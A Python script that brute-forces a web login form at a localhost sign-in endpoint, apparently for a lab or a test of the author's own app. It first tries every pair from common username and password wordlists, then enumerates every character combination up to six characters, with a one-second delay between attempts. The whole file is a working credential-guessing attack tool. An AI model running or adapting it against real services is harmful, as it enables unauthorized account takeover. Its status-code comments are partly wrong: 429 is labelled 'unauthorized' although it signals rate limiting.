import requests
import itertools
import string
import time

# Extended character set for more complex brute force attempts
CHAR_SET = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

url = 'http://127.0.0.1:5000/signin'

def attempt_login(username, password):
    payload = {'username': username, 'password': password}
    with requests.Session() as session:
        response = session.post(url, data=payload, allow_redirects=True)
        # Check the status code to determine if login was successful
        if response.status_code == 200:  # 200 means a successful login
            return True, session
        elif response.status_code == 401:  # 401 means login failed
            print("fail")
            return False, session
        elif response.status_code == 429:  # 429 means unauthorized
            print("unauthorized!")
            return False, session
        else:
            # Handle other unexpected status codes
            return False, session


# Function to simulate a delay to reduce server load and simulate realistic attack timings
def simulated_delay():
    time.sleep(1)  # Adjust the delay as needed to control the request rate


# Read usernames and passwords from files
def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]


usernames = read_file('../dataset/top-usernames-shortlist.txt')
passwords = read_file('../dataset/10-million-password-list-top-1000.txt')

# Try logging in with combinations of common usernames and passwords
def username_brute():
    for username in usernames:
        for password in passwords:
            print(f"Attempting login with Username: {username}, Password: {password}")
            simulated_delay()
            logged_in, session = attempt_login(username, password)
            if logged_in:
                print(f"Success! Username: {username}, Password: {password}")
                return logged_in, username, password, session
                # break

# Try different lengths for username and password
def length_brute():
    for username_length in range(1, 7):
        for password_length in range(1, 7):
            for username in itertools.product(CHAR_SET, repeat=username_length):
                for password in itertools.product(CHAR_SET, repeat=password_length):
                    username_str = ''.join(username)
                    password_str = ''.join(password)

                    # Log each attempt
                    print(f"Attempting login with Username: {username_str}, Password: {password_str}")
                    simulated_delay()  # Reduce the speed of attempts to mimic realistic conditions
                    logged_in, session = attempt_login(username_str, password_str)
                    if logged_in:
                        print(f"Success! Username: {username_str}, Password: {password_str}")
                        return logged_in, username_str, password_str, session # break  # Exit after the first successful login

